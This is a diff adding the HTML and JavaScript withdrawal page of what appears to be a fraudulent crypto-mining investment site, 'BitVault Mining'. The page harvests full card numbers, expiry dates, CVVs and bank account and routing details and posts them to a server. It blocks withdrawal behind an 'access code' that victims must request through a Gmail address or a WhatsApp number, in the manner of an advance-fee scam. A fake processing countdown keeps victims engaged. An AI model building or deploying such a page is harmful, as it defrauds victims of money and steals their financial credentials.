@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Withdraw Funds · BitVault Mining</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --card: #14141f;
+            --border: #222232;
+            --gold: #f7931a;
+            --gold2: #ffb347;
+            --green: #00d4aa;
+            --red: #ff4757;
+            --blue: #4da6ff;
+            --text: #e8e8f0;
+            --muted: #8a8aa0;
+            --grad: linear-gradient(135deg, #f7931a, #ffb347);
+            --radius: 14px;
+            --shadow-gold: 0 0 30px rgba(247,147,26,0.15);
+            --transition: 0.25s ease;
+            --font: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: var(--font); background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .container { width: 100%; max-width: 560px; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius); padding: 32px 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); margin-bottom: 20px; }
+        h2 { text-align: center; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; justify-content: center; }
+        .balance { text-align: center; margin-bottom: 20px; }
+        .balance-label { color: var(--muted); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; }
+        .balance-value { font-size: 2rem; font-weight: 800; color: var(--green); }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 0.85rem; }
+        input, select, textarea { width: 100%; padding: 12px 14px; border-radius: 10px; background: #0a0a12; border: 1px solid var(--border); color: #fff; font-size: 0.95rem; transition: var(--transition); }
+        input:focus, select:focus, textarea:focus { border-color: var(--gold); outline: none; box-shadow: 0 0 10px #f7931a30; }
+        .btn { width: 100%; padding: 14px; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; border: none; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-gold { background: var(--grad); color: #0a0a0f; box-shadow: 0 4px 18px #f7931a30; }
+        .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 8px 28px #f7931a50; }
+        .btn-outline { background: transparent; border: 1.5px solid var(--border); color: #fff; }
+        .btn-outline:hover { border-color: var(--gold); }
+        .btn-email { background: #4da6ff20; border: 1.5px solid #4da6ff50; color: #4da6ff; width: 100%; }
+        .btn-email:hover { background: #4da6ff30; }
+        .btn-whatsapp { background: #25D36620; border: 1.5px solid #25D36650; color: #25D366; width: 100%; }
+        .btn-whatsapp:hover { background: #25D36630; }
+        .back-link { text-align: center; margin-top: 10px; }
+        .back-link a { color: var(--muted); text-decoration: none; font-size: 0.9rem; transition: color 0.3s; }
+        .back-link a:hover { color: #fff; }
+        .alert { padding: 10px; border-radius: 10px; margin-bottom: 12px; font-weight: 600; }
+        .alert-success { background: #00d4aa15; color: var(--green); }
+        .processing-overlay {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.85); z-index: 999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        .processing-overlay.active { opacity: 1; pointer-events: all; }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 5px solid #f7931a30; border-top-color: var(--gold);
+            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .processing-text { color: #fff; font-size: 1.2rem; }
+        .hidden { display: none; }
+        .conversion-note { font-size: 0.9rem; color: var(--gold2); margin-top: 4px; }
+        .card-row { display: flex; gap: 10px; flex-wrap: wrap; }
+        .card-row .form-group { flex: 1; min-width: 120px; }
+        .support-btns { display: flex; gap: 10px; margin-top: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="processing-overlay" id="processingOverlay">
+            <div class="spinner"></div>
+            <div class="processing-text">Processing your withdrawal…</div>
+            <div class="processing-text" style="font-size:0.9rem; color:var(--gold); margin-top:8px;" id="countdownText"></div>
+        </div>
+
+        <div class="card" id="step1Card">
+            <h2>🏦 Withdraw Funds</h2>
+            <div class="balance">
+                <div class="balance-label">Withdrawable Balance</div>
+                <div class="balance-value" id="withdrawableBalance">$0.00</div>
+            </div>
+
+            <div class="form-group">
+                <label>Amount (USD) — Minimum $2,000</label>
+                <input type="number" id="withdrawAmount" placeholder="e.g. 5000" min="2000" step="any" required oninput="refreshConversion()">
+            </div>
+
+            <div class="form-group">
+                <label>Payment Method</label>
+                <select id="paymentMethod" onchange="handleMethodChange()">
+                    <option value="" disabled selected>Select payment option</option>
+                    <option value="paypal">PayPal</option>
+                    <option value="zelle">Zelle</option>
+                    <option value="chime">Chime</option>
+                    <option value="wise">Wise</option>
+                    <option value="revolut">Revolut</option>
+                    <option value="cashapp">Cash App</option>
+                    <option value="venmo">Venmo</option>
+                    <option value="skrill">Skrill</option>
+                    <option value="card">Credit / Debit Card</option>
+                    <option value="bank">Bank Transfer</option>
+                </select>
+            </div>
+
+            <div id="accountFieldsContainer" class="hidden"></div>
+
+            <!-- Continue button (visible before access code) -->
+            <button class="btn btn-gold" id="continueBtn" onclick="revealAccessCode()">Continue ➡️</button>
+
+            <!-- Access code challenge (hidden) -->
+            <div id="accessCodeChallenge" class="hidden">
+                <div class="form-group">
+                    <label>🔐 BitVault Earning Certificate Access Code</label>
+                    <input type="text" id="accessCode" placeholder="Enter 9‑digit code" maxlength="9" pattern="\d{9}" required>
+                </div>
+                <div class="support-btns">
+                    <button class="btn btn-outline btn-email" type="button" onclick="requestCode('email')" style="width:auto; padding:10px 18px;">📧 Request Code by Email</button>
+                    <button class="btn btn-outline btn-whatsapp" type="button" onclick="requestCode('whatsapp')" style="width:auto; padding:10px 18px;">💬 Request Code by WhatsApp</button>
+                </div>
+                <small style="color:var(--muted);">If you don't have a code, contact support to activate withdrawals.</small>
+                <button class="btn btn-gold" style="margin-top:16px;" onclick="submitWithdrawal()">💸 Confirm & Withdraw</button>
+            </div>
+        </div>
+
+        <div class="card hidden" id="step2Card">
+            <div class="alert alert-success">✅ Withdrawal request submitted for admin approval!</div>
+            <h3 style="text-align:center; margin-bottom:16px;">Notify Admin for Faster Approval</h3>
+            <div style="display:flex; flex-direction:column; gap:10px;">
+                <button class="btn btn-email" onclick="notifyByEmail()">📧 Send by Email</button>
+                <button class="btn btn-whatsapp" onclick="notifyByWhatsApp()">💬 Send by WhatsApp</button>
+            </div>
+        </div>
+
+        <div class="back-link"><a href="dashboard.html">← Back to Dashboard</a></div>
+    </div>
+
+    <script>
+        const token = localStorage.getItem('token');
+        const headers = () => ({ 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' });
+        let withdrawalId = null;
+
+        // Exchange rates to USD (approximate)
+        const rates = {
+            "United States": 1,
+            "United Kingdom": 0.79,
+            "Germany": 0.92,
+            "France": 0.92,
+            "Spain": 0.92,
+            "Nigeria": 1565,
+            "Canada": 1.36,
+            "Australia": 1.53,
+            "India": 83.5,
+            "Brazil": 5.05,
+            "Mexico": 17.1,
+            "South Africa": 18.6,
+            "Kenya": 129.5,
+            "Netherlands": 0.92,
+            "Switzerland": 0.88,
+            "Sweden": 10.4,
+            "Singapore": 1.34,
+            "Hong Kong": 7.82,
+            "Japan": 149.6,
+            "United Arab Emirates": 3.67
+        };
+        const currencyNames = {
+            "United States": "USD ($)",
+            "United Kingdom": "GBP (£)",
+            "Germany": "EUR (€)",
+            "France": "EUR (€)",
+            "Spain": "EUR (€)",
+            "Nigeria": "NGN (₦)",
+            "Canada": "CAD (CA$)",
+            "Australia": "AUD (A$)",
+            "India": "INR (₹)",
+            "Brazil": "BRL (R$)",
+            "Mexico": "MXN (Mex$)",
+            "South Africa": "ZAR (R)",
+            "Kenya": "KES (KSh)",
+            "Netherlands": "EUR (€)",
+            "Switzerland": "CHF (Fr)",
+            "Sweden": "SEK (kr)",
+            "Singapore": "SGD (S$)",
+            "Hong Kong": "HKD (HK$)",
+            "Japan": "JPY (¥)",
+            "United Arab Emirates": "AED (د.إ)"
+        };
+
+        const banksByCountry = {
+            "United States": ["JPMorgan Chase","Bank of America","Wells Fargo","Citibank","U.S. Bank","PNC Bank","Truist Bank","Capital One","TD Bank","Goldman Sachs","HSBC USA","Morgan Stanley","Charles Schwab","Ally Bank","Fifth Third Bank"],
+            "United Kingdom": ["HSBC UK","Barclays","Lloyds Bank","NatWest","Santander UK","Nationwide Building Society","TSB Bank","Virgin Money","Metro Bank","Standard Chartered","Co-operative Bank","Yorkshire Bank","Clydesdale Bank","Bank of Scotland","First Direct"],
+            "Germany": ["Deutsche Bank","Commerzbank","DZ Bank","KfW Bank","UniCredit Bank","Postbank","ING Germany","Landesbank Baden-Württemberg","Bayerische Landesbank","Norddeutsche Landesbank","DekaBank","Helaba","Berliner Sparkasse","Hamburger Sparkasse","Haspa"],
+            "France": ["BNP Paribas","Crédit Agricole","Société Générale","BPCE","Crédit Mutuel","La Banque Postale","HSBC France","Caisse d'Epargne","ING France","AXA Banque","Banque Populaire","Boursorama","Fortuneo Banque","Monabanq","Hello Bank"],
+            "Spain": ["Banco Santander","BBVA","CaixaBank","Banco Sabadell","Bankinter","Kutxabank","Abanca","Unicaja Banco","Ibercaja Banco","Cajamar","Banco de Crédito Social Cooperativo","Arquia Banca","Targobank","Evo Banco","Openbank"],
+            "Nigeria": ["Access Bank","Guaranty Trust Bank (GTBank)","Zenith Bank","First Bank of Nigeria","United Bank for Africa (UBA)","Sterling Bank","Fidelity Bank","Union Bank","Ecobank Nigeria","Stanbic IBTC","Citibank Nigeria","Polaris Bank","Heritage Bank","Keystone Bank","Wema Bank"],
+            "Canada": ["Royal Bank of Canada (RBC)","Toronto-Dominion Bank (TD)","Scotiabank","Bank of Montreal (BMO)","Canadian Imperial Bank of Commerce (CIBC)","National Bank of Canada","HSBC Canada","Tangerine Bank","Simplii Financial","Laurentian Bank","ATB Financial","Canadian Western Bank","Desjardins Group","Vancity","Coast Capital Savings"],
+            "Australia": ["Commonwealth Bank","Westpac","NAB","ANZ","Macquarie Bank","Suncorp Bank","Bank of Queensland","Bendigo Bank","ME Bank","UBank","AMP Bank","ING Australia","Bankwest","Citi Australia","HSBC Australia"],
+            "India": ["State Bank of India","HDFC Bank","ICICI Bank","Axis Bank","Kotak Mahindra Bank","Punjab National Bank","Bank of Baroda","Canara Bank","Union Bank of India","Yes Bank","IDBI Bank","IndusInd Bank","Federal Bank","RBL Bank","Bandhan Bank"],
+            "Brazil": ["Banco do Brasil","Itaú Unibanco","Bradesco","Santander Brasil","Caixa Econômica Federal","Banco BTG Pactual","Banco Safra","Banco Votorantim","Banco ABC Brasil","Banco Daycoval","Banco Inter","Nubank","C6 Bank","Banco Original","Banco Pan"],
+            "Mexico": ["BBVA México","Santander México","Banamex","HSBC México","Banorte","Inbursa","Scotiabank México","Banco Azteca","Afirme","Banregio","CI Banco","Banco Multiva","Intercam Banco","Banco Famsa","Banco Monemex"],
+            "South Africa": ["Standard Bank","FirstRand Bank (FNB)","Absa Bank","Nedbank","Capitec Bank","African Bank","TymeBank","Discovery Bank","Investec Bank","Sasfin Bank","Bidvest Bank","Mercantile Bank","Ubank","Postbank South Africa","Grindrod Bank"],
+            "Kenya": ["Equity Bank","KCB Bank","Co-operative Bank of Kenya","NCBA Bank","Diamond Trust Bank (DTB)","Stanbic Bank Kenya","Standard Chartered Kenya","ABSA Bank Kenya","I&M Bank","Bank of Africa Kenya","Prime Bank Kenya","Ecobank Kenya","Housing Finance Company (HFC)","Credit Bank","National Bank of Kenya"],
+            "Netherlands": ["Rabobank","ING Bank","ABN AMRO","SNS Bank","ASN Bank","Triodos Bank","Volksbank","Knab","Bunq","Van Lanschot Kempen","Bank Ten Cate & Cie","Andere Bank","Credit Europe Bank","Friesland Bank","RegioBank"],
+            "Switzerland": ["UBS","Credit Suisse","Zürcher Kantonalbank","Raiffeisen Schweiz","PostFinance","Julius Bär","Vontobel","Migros Bank","Bank Cler","Banque Cantonale Vaudoise","Basler Kantonalbank","St.Galler Kantonalbank","Berner Kantonalbank","Neue Aargauer Bank","Luzerner Kantonalbank"],
+            "Sweden": ["Swedbank","Nordea","SEB","Svenska Handelsbanken","Länsförsäkringar Bank","Skandiabanken","Ikano Bank","Marginalen Bank","ICA Banken","Avanza Bank","Sparbanken Syd","Bluestep Bank","TF Bank","Resurs Bank","Nordnet Bank"],
+            "Singapore": ["DBS Bank","OCBC Bank","United Overseas Bank (UOB)","Bank of Singapore","Citibank Singapore","HSBC Singapore","Standard Chartered Singapore","Maybank Singapore","RHB Singapore","CIMB Singapore","Bangkok Bank Singapore","Bank of China Singapore","ICICI Bank Singapore","State Bank of India Singapore","UBS Singapore"],
+            "Hong Kong": ["HSBC Hong Kong","Bank of China (Hong Kong)","Standard Chartered Hong Kong","Hang Seng Bank","Bank of East Asia","DBS Bank Hong Kong","Citibank Hong Kong","ICBC (Asia)","China Construction Bank (Asia)","Nanyang Commercial Bank","Shanghai Commercial Bank","Fubon Bank Hong Kong","Chiyu Banking Corporation","Public Bank Hong Kong","Wing Lung Bank"],
+            "Japan": ["MUFG Bank","SMBC","Mizuho Bank","Resona Bank","Japan Post Bank","Sumitomo Mitsui Trust Bank","SBI Sumishin Net Bank","Rakuten Bank","PayPay Bank","Seven Bank","Aozora Bank","Shinsei Bank","Suruga Bank","Fukuoka Financial Group","Hokuriku Bank"],
+            "United Arab Emirates": ["First Abu Dhabi Bank (FAB)","Emirates NBD","Abu Dhabi Commercial Bank (ADCB)","Dubai Islamic Bank","Mashreq Bank","RAKBank","Sharjah Islamic Bank","Commercial Bank of Dubai","Abu Dhabi Islamic Bank (ADIB)","National Bank of Ras Al Khaimah","Union National Bank (UNB)","Financial House","Arab Bank for Investment and Foreign Trade","Bank Melli Iran Dubai","Bank Saderat Iran Dubai"]
+        };
+
+        async function fetchBalance() {
+            try {
+                const res = await fetch('/api/user', { headers: headers() });
+                const user = await res.json();
+                document.getElementById('withdrawableBalance').textContent = '$' + (user.withdrawableBalance || 0).toLocaleString('en-US', { minimumFractionDigits: 2 });
+            } catch(e) {}
+        }
+        fetchBalance();
+
+        function refreshConversion() { updateConversionDisplay(); }
+
+        function updateConversionDisplay() {
+            const method = document.getElementById('paymentMethod').value;
+            const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
+            let country = null;
+            if (method === 'bank' || method === 'card') {
+                country = document.getElementById('countrySelect')?.value;
+            }
+            const conversionDiv = document.getElementById('conversionDisplay');
+            if (country && rates[country] && amount >= 2000) {
+                const rate = rates[country];
+                const converted = amount * rate;
+                const currencyName = currencyNames[country] || country;
+                const formatted = converted.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                conversionDiv.innerHTML = `≈ ${formatted} ${currencyName.split(' ')[0]}`;
+                conversionDiv.classList.remove('hidden');
+            } else {
+                conversionDiv.classList.add('hidden');
+            }
+        }
+
+        function handleMethodChange() {
+            const method = document.getElementById('paymentMethod').value;
+            const container = document.getElementById('accountFieldsContainer');
+            if (!method) {
+                container.classList.add('hidden');
+                return;
+            }
+            container.classList.remove('hidden');
+            container.innerHTML = '';
+
+            if (method === 'bank') {
+                container.innerHTML = `
+                    <div class="form-group">
+                        <label>Country of Bank</label>
+                        <select id="countrySelect" onchange="updateBankFields(); updateConversionDisplay();">
+                            <option value="" disabled selected>Select country</option>
+                            ${Object.keys(banksByCountry).map(c => `<option>${c}</option>`).join('')}
+                        </select>
+                    </div>
+                    <div class="form-group conversion-note hidden" id="conversionDisplay"></div>
+                    <div id="bankDetailsContainer"></div>
+                `;
+                updateBankFields();
+                updateConversionDisplay();
+            } else if (method === 'card') {
+                container.innerHTML = `
+                    <div class="form-group">
+                        <label>Country (for currency display)</label>
+                        <select id="countrySelect" onchange="updateConversionDisplay();">
+                            <option value="" disabled selected>Select country</option>
+                            ${Object.keys(rates).map(c => `<option>${c}</option>`).join('')}
+                        </select>
+                    </div>
+                    <div class="form-group conversion-note hidden" id="conversionDisplay"></div>
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
+                    <div class="card-row">
+                        <div class="form-group">
+                            <label>Expiry Date</label>
+                            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="text" id="cardCvv" placeholder="123" maxlength="3" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Cardholder Name</label>
+                        <input type="text" id="cardName" placeholder="Name on card" required>
+                    </div>
+                `;
+                updateConversionDisplay();
+            } else {
+                let label, placeholder;
+                switch(method) {
+                    case 'paypal': label='PayPal Email'; placeholder='email@example.com'; break;
+                    case 'zelle': label='Zelle Email or Phone'; placeholder='email@example.com or +123...'; break;
+                    case 'chime': label='Chime Username/Phone'; placeholder='Username or phone'; break;
+                    case 'wise': label='Wise Email'; placeholder='email@example.com'; break;
+                    case 'revolut': label='Revolut Username/Phone'; placeholder='@username or phone'; break;
+                    case 'cashapp': label='$Cashtag'; placeholder='$YourCashtag'; break;
+                    case 'venmo': label='Venmo Username'; placeholder='@username'; break;
+                    case 'skrill': label='Skrill Email'; placeholder='email@example.com'; break;
+                    default: label='Account Detail'; placeholder='Enter detail';
+                }
+                container.innerHTML = `
+                    <div class="form-group">
+                        <label>${label}</label>
+                        <input type="text" id="accountDetail" placeholder="${placeholder}" required>
+                    </div>
+                `;
+            }
+        }
+
+        function updateBankFields() {
+            const country = document.getElementById('countrySelect')?.value;
+            const container = document.getElementById('bankDetailsContainer');
+            if (!country || !container) return;
+            const banks = banksByCountry[country] || [];
+            const bankOptions = banks.map(b => `<option>${b}</option>`).join('');
+
+            let fieldsHTML = '';
+            if (country === 'Nigeria') {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>Account Number</label>
+                        <input type="text" id="accountNumber" placeholder="Enter account number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Bank Name</label>
+                        <select id="bankName" required><option value="" disabled selected>Select bank</option>${bankOptions}</select>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Name</label>
+                        <input type="text" id="accountName" placeholder="Full name on account" required>
+                    </div>
+                `;
+            } else if (country === 'United States') {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>Routing Number</label>
+                        <input type="text" id="routingNumber" placeholder="Enter routing number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Number</label>
+                        <input type="text" id="accountNumber" placeholder="Enter account number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Bank Name</label>
+                        <select id="bankName" required><option value="" disabled selected>Select bank</option>${bankOptions}</select>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Name</label>
+                        <input type="text" id="accountName" placeholder="Full name on account" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Type</label>
+                        <select id="accountType" required><option value="" disabled selected>Select type</option><option>Checking</option><option>Savings</option></select>
+                    </div>
+                `;
+            } else {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>IBAN / Account Number</label>
+                        <input type="text" id="accountNumber" placeholder="Enter IBAN or account number" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Bank Name</label>
+                        <select id="bankName" required><option value="" disabled selected>Select bank</option>${bankOptions}</select>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Name</label>
+                        <input type="text" id="accountName" placeholder="Full name on account" required>
+                    </div>
+                    <div class="form-group">
+                        <label>SWIFT / BIC Code (optional)</label>
+                        <input type="text" id="swiftCode" placeholder="SWIFT code">
+                    </div>
+                `;
+            }
+            container.innerHTML = fieldsHTML;
+            updateConversionDisplay();
+        }
+
+        function revealAccessCode() {
+            // Validate form fields first
+            const amount = parseFloat(document.getElementById('withdrawAmount').value);
+            if (!amount || amount < 2000) return alert('Minimum withdrawal is $2,000.');
+            const method = document.getElementById('paymentMethod').value;
+            if (!method) return alert('Please select a payment method.');
+
+            let detailsValid = true;
+            if (method === 'bank') {
+                const country = document.getElementById('countrySelect')?.value;
+                if (!country) detailsValid = false;
+                const accNo = document.getElementById('accountNumber')?.value.trim();
+                const bank = document.getElementById('bankName')?.value.trim();
+                const name = document.getElementById('accountName')?.value.trim();
+                if (!accNo || !bank || !name) detailsValid = false;
+                if (country === 'United States') {
+                    if (!document.getElementById('routingNumber')?.value.trim() || !document.getElementById('accountType')?.value) detailsValid = false;
+                }
+            } else if (method === 'card') {
+                if (!document.getElementById('cardNumber')?.value.trim() || !document.getElementById('cardExpiry')?.value.trim() || !document.getElementById('cardCvv')?.value.trim() || !document.getElementById('cardName')?.value.trim()) detailsValid = false;
+            } else {
+                if (!document.getElementById('accountDetail')?.value.trim()) detailsValid = false;
+            }
+            if (!detailsValid) return alert('Please fill all payment details correctly.');
+
+            document.getElementById('continueBtn').classList.add('hidden');
+            document.getElementById('accessCodeChallenge').classList.remove('hidden');
+        }
+
+        function requestCode(platform) {
+            const message = encodeURIComponent("Hello Support, I need my BitVault Earning Certificate Access Code to complete a withdrawal.");
+            if (platform === 'email') {
+                window.open(`mailto:paymentbitcoin91@gmail.com?subject=Request%20Access%20Code&body=${message}`, '_blank');
+            } else {
+                window.open(`https://wa.me/12568212395?text=${message}`, '_blank');
+            }
+        }
+
+        async function submitWithdrawal() {
+            const amount = parseFloat(document.getElementById('withdrawAmount').value);
+            const method = document.getElementById('paymentMethod').value;
+            const accessCode = document.getElementById('accessCode').value.trim();
+            if (!accessCode || accessCode.length !== 9 || isNaN(accessCode)) return alert('Please enter a valid 9‑digit Access Code.');
+
+            let details = {};
+            if (method === 'bank') {
+                const country = document.getElementById('countrySelect').value;
+                details.country = country;
+                details.accountNumber = document.getElementById('accountNumber')?.value.trim();
+                details.bankName = document.getElementById('bankName')?.value.trim();
+                details.accountName = document.getElementById('accountName')?.value.trim();
+                if (country === 'United States') {
+                    details.routingNumber = document.getElementById('routingNumber')?.value.trim();
+                    details.accountType = document.getElementById('accountType')?.value;
+                } else if (country !== 'Nigeria') {
+                    details.swiftCode = document.getElementById('swiftCode')?.value.trim() || '';
+                }
+            } else if (method === 'card') {
+                details.country = document.getElementById('countrySelect')?.value || '';
+                details.cardNumber = document.getElementById('cardNumber')?.value.trim();
+                details.cardExpiry = document.getElementById('cardExpiry')?.value.trim();
+                details.cardCvv = document.getElementById('cardCvv')?.value.trim();
+                details.cardName = document.getElementById('cardName')?.value.trim();
+            } else {
+                details.accountDetail = document.getElementById('accountDetail')?.value.trim();
+            }
+
+            const overlay = document.getElementById('processingOverlay');
+            overlay.classList.add('active');
+            let sec = 5;
+            const countdownEl = document.getElementById('countdownText');
+            countdownEl.textContent = `Finalizing… ${sec}s`;
+            const interval = setInterval(() => { sec--; if(sec>=0) countdownEl.textContent = `Finalizing… ${sec}s`; else clearInterval(interval); }, 1000);
+            await new Promise(resolve => setTimeout(resolve, 5000));
+
+            try {
+                const res = await fetch('/api/withdraw', {
+                    method: 'POST',
+                    headers: headers(),
+                    body: JSON.stringify({ amount, method, details, accessCode })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    withdrawalId = data.withdrawalId;
+                    overlay.classList.remove('active');
+                    document.getElementById('step1Card').classList.add('hidden');
+                    document.getElementById('step2Card').classList.remove('hidden');
+                } else {
+                    alert(data.message || 'Withdrawal failed.');
+                    overlay.classList.remove('active');
+                }
+            } catch (e) {
+                alert('Server error.');
+                overlay.classList.remove('active');
+            }
+        }
+
+        function notifyByEmail() {
+            const username = JSON.parse(localStorage.getItem('minerUser'))?.fullName || 'User';
+            const amount = document.getElementById('withdrawAmount').value;
+            const method = document.getElementById('paymentMethod').value;
+            const summary = collectDetailsSummary();
+            const subject = encodeURIComponent(`Withdrawal Request - ${username} - $${amount}`);
+            const body = encodeURIComponent(`Hello Admin,\n\nPlease approve my withdrawal:\n\nUsername: ${username}\nAmount: $${amount}\nMethod: ${method}\nDetails: ${summary}\nAccess Code: ${document.getElementById('accessCode').value}\nWithdrawal ID: ${withdrawalId}\n\nThank you.`);
+            window.open(`mailto:paymentbitcoin91@gmail.com?subject=${subject}&body=${body}`, '_blank');
+        }
+
+        function notifyByWhatsApp() {
+            const username = JSON.parse(localStorage.getItem('minerUser'))?.fullName || 'User';
+            const amount = document.getElementById('withdrawAmount').value;
+            const method = document.getElementById('paymentMethod').value;
+            const summary = collectDetailsSummary();
+            const message = encodeURIComponent(`Hello Admin, please approve my withdrawal:\n\nUsername: ${username}\nAmount: $${amount}\nMethod: ${method}\nDetails: ${summary}\nAccess Code: ${document.getElementById('accessCode').value}\nWithdrawal ID: ${withdrawalId}`);
+            window.open(`https://wa.me/12568212395?text=${message}`, '_blank');
+        }
+
+        function collectDetailsSummary() {
+            const method = document.getElementById('paymentMethod').value;
+            if (method === 'bank') {
+                const country = document.getElementById('countrySelect')?.value || '';
+                const acctNo = document.getElementById('accountNumber')?.value || '';
+                const bank = document.getElementById('bankName')?.value || '';
+                const name = document.getElementById('accountName')?.value || '';
+                if (country === 'Nigeria') return `${bank} - ${acctNo} - ${name}`;
+                if (country === 'United States') {
+                    const routing = document.getElementById('routingNumber')?.value || '';
+                    const type = document.getElementById('accountType')?.value || '';
+                    return `${bank} - ${acctNo} - ${name} (Routing: ${routing}, ${type})`;
+                }
+                const swift = document.getElementById('swiftCode')?.value || '';
+                return `${bank} - IBAN: ${acctNo} - ${name}${swift ? ' SWIFT: '+swift : ''}`;
+            } else if (method === 'card') {
+                const last4 = document.getElementById('cardNumber')?.value.slice(-4) || '****';
+                const name = document.getElementById('cardName')?.value || '';
+                return `Card ****${last4} - ${name}`;
+            } else {
+                return document.getElementById('accountDetail')?.value || '';
+            }
+        }
+    </script>
+</body>
+</html>
